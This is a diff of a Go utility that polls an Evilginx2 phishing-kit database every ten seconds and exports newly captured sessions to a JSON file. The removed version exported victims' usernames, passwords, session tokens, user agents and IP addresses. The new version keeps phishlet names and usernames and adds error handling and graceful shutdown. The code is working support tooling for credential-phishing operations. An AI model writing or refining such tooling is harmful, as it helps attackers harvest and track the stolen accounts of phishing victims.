@@ -3,113 +3,104 @@ package main
 import (
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
 	"os"
+	"os/signal"
 	"time"
 
 	"github.com/tidwall/buntdb"
 )
 
-// Session struct should match your database session structure
 type Session struct {
-	Id           int               `json:"id"`
-	Phishlet     string            `json:"phishlet"`
-	LandingURL   string            `json:"landing_url"`
-	Username     string            `json:"username"`
-	Password     string            `json:"password"`
-	Custom       map[string]string `json:"custom"`
-	BodyTokens   map[string]string `json:"body_tokens"`
-	HttpTokens   map[string]string `json:"http_tokens"`
-	SessionId    string            `json:"session_id"`
-	UserAgent    string            `json:"useragent"`
-	RemoteAddr   string            `json:"remote_addr"`
-	CreateTime   int64             `json:"create_time"`
-	UpdateTime   int64             `json:"update_time"`
+	Id         int    `json:"id"`
+	Phishlet   string `json:"phishlet"`
+	Username   string `json:"username"`
+	UpdateTime int64  `json:"update_time"`
 }
 
-const jsonFileName = "sessions.json"
+const (
+	dbFileName  = "data.db"
+	jsonFileName = "sessions.json"
+)
 
 func main() {
-	// Open the database
-	db, err := buntdb.Open("data.db") // Update with the actual path to your Evilginx2 database
+	db, err := buntdb.Open(dbFileName)
 	if err != nil {
 		fmt.Println("Error opening database:", err)
 		return
 	}
 	defer db.Close()
 
-	// Initialize JSON file with an empty array if it doesn't exist
+	// Initialize JSON file
 	initializeJSONFile(jsonFileName)
 
-	// Track the last update time for monitoring new sessions
 	var lastUpdateTime int64
 
-	for {
-		newSessions := []*Session{}
+	// Graceful shutdown
+	stop := make(chan os.Signal, 1)
+	signal.Notify(stop, os.Interrupt)
+	go func() {
+		<-stop
+		fmt.Println("Shutting down...")
+		db.Close()
+		os.Exit(0)
+	}()
 
-		// Start a read-only transaction
-		db.View(func(tx *buntdb.Tx) error {
-			// Iterate over all sessions sorted by update time
-			tx.Ascend("sessions_id", func(key, val string) bool {
-				s := &Session{}
-				json.Unmarshal([]byte(val), s)
+	for {
+		var newSessions []*Session
+
+		err := db.View(func(tx *buntdb.Tx) error {
+			return tx.Ascend("sessions_id", func(key, val string) bool {
+				var s Session
+				if err := json.Unmarshal([]byte(val), &s); err != nil {
+					fmt.Println("Error unmarshaling session:", err)
+					return true // Skip invalid entry
+				}
 				if s.UpdateTime > lastUpdateTime {
-					newSessions = append(newSessions, s)
+					newSessions = append(newSessions, &s)
 				}
 				return true
 			})
-			return nil
 		})
+		if err != nil {
+			fmt.Println("Error reading from database:", err)
+			continue
+		}
 
-		// Append new sessions to the JSON file
 		if len(newSessions) > 0 {
-			err := appendSessionsToJson(newSessions, jsonFileName)
-			if err != nil {
-				fmt.Println("Error appending sessions to JSON:", err)
+			if err := appendSessionsToJson(newSessions, jsonFileName); err != nil {
+				fmt.Println("Error appending sessions:", err)
 			}
-			// Update lastUpdateTime based on the latest session processed
 			lastUpdateTime = newSessions[len(newSessions)-1].UpdateTime
 		}
 
-		// Poll every 10 seconds
 		time.Sleep(10 * time.Second)
 	}
 }
 
-// Initialize JSON file with an empty array if the file does not exist
 func initializeJSONFile(filename string) {
 	if _, err := os.Stat(filename); os.IsNotExist(err) {
-		file, err := os.Create(filename)
-		if err != nil {
+		if err := os.WriteFile(filename, []byte("[]"), 0644); err != nil {
 			fmt.Println("Error creating JSON file:", err)
-			return
 		}
-		defer file.Close()
-		file.Write([]byte("[]"))
 	}
 }
 
-// Append new sessions to the JSON file
 func appendSessionsToJson(sessions []*Session, filename string) error {
-	// Load existing sessions
-	existingData, err := ioutil.ReadFile(filename)
+	data, err := os.ReadFile(filename)
 	if err != nil {
 		return err
 	}
 
 	var allSessions []*Session
-	if err := json.Unmarshal(existingData, &allSessions); err != nil {
+	if err := json.Unmarshal(data, &allSessions); err != nil {
 		return err
 	}
 
-	// Append new sessions
 	allSessions = append(allSessions, sessions...)
-
-	// Write updated array back to file
 	newData, err := json.MarshalIndent(allSessions, "", "  ")
 	if err != nil {
 		return err
 	}
 
-	return ioutil.WriteFile(filename, newData, 0644)
+	return os.WriteFile(filename, newData, 0644)
 }
